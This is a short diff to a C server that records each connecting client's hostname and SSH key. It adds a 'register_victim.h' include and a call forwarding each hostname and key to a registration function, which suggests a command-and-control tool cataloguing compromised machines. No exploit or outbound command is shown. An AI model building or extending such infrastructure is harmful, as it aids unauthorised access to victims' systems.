@@ -5,6 +5,7 @@
 #include <pthread.h>
 #include <arpa/inet.h>
 #include "server.h"
+#include "register_victim.h"
 
 Client clients[MAX_CLIENTS];
 int client_count = 0;
@@ -33,7 +34,8 @@ void* handle_client(void* arg) {
                     clients[client_count].hostname[sizeof(clients[client_count].hostname)-1] = '\0';
                     clients[client_count].sshkey[sizeof(clients[client_count].sshkey)-1] = '\0';
                     client_count++;
-                    printf("New client registered: %s - Key: %s\n", hostname, sshkey);
+                    printf("[+] New client registered: %s - Key: %s\n", hostname, sshkey);
+                    register_simple(hostname, sshkey);
                 }
                 pthread_mutex_unlock(&lock);
             }
